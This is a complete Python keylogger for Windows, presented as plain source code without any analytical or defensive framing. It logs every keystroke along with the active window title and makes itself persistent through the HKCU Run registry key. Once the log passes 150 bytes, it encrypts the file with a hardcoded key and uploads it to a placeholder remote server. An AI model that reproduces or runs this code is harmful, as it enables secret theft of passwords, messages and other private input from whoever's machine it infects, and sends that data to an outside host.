from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import win32gui
import requests
import os
import winreg as reg

windowTile = ""
key = b"3FTsa2I1OSr-Z0OQ-M_NRcE9kQt_inhc4K-xoZasriw="
fernet = Fernet(key)

def AddToRegistry():
    # in python __file__ is the instant of file path where it was executed
    # so if it was executed from desktop, then __file__ will be c:\users\current_user\desktop
    pth = os.path.dirname(os.path.realpath(__file__))
     
    # name of the python file with extension
    s_name="start.py"    
     
    # joins the file name to end of path address
    address=os.path.join(pth,s_name)
     
    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
     
    # open the key to make changes to
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
     
    # modify the opened key
    reg.SetValueEx(open,"kl_script",0,reg.REG_SZ,address)
     
    # now close the opened key
    reg.CloseKey(open)


def get_current_window():
    global windowTile
    while( True ) :
        newWindowTile = win32gui.GetWindowText (win32gui.GetForegroundWindow())
        if( newWindowTile != windowTile ) :
            windowTile = newWindowTile
            return "\n" + windowTile + "\n"
        else:
            return ""

def encrypt_file():
    with open('log.txt', 'rb') as file:
	    original = file.read()
    encrypted = fernet.encrypt(original)
    with open('log.txt', 'wb') as encrypted_file:
	    encrypted_file.write(encrypted)

def send_reports():
    encrypt_file()
    ci_file = open("log.txt", "rb")
    upload_file = {"log": ci_file}
    url = "http://[serverIP:Port]/upload.php"
    r = requests.post(url, files = upload_file)
    print("file uploaded")

def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    with open("log.txt", 'a') as f:
        if (os.stat('log.txt').st_size > 150):
            send_reports()
            f.truncate(0)
        f.write(get_current_window())
        f.write(key)

AddToRegistry()
with Listener(on_press=log_keystroke) as l:
    l.join()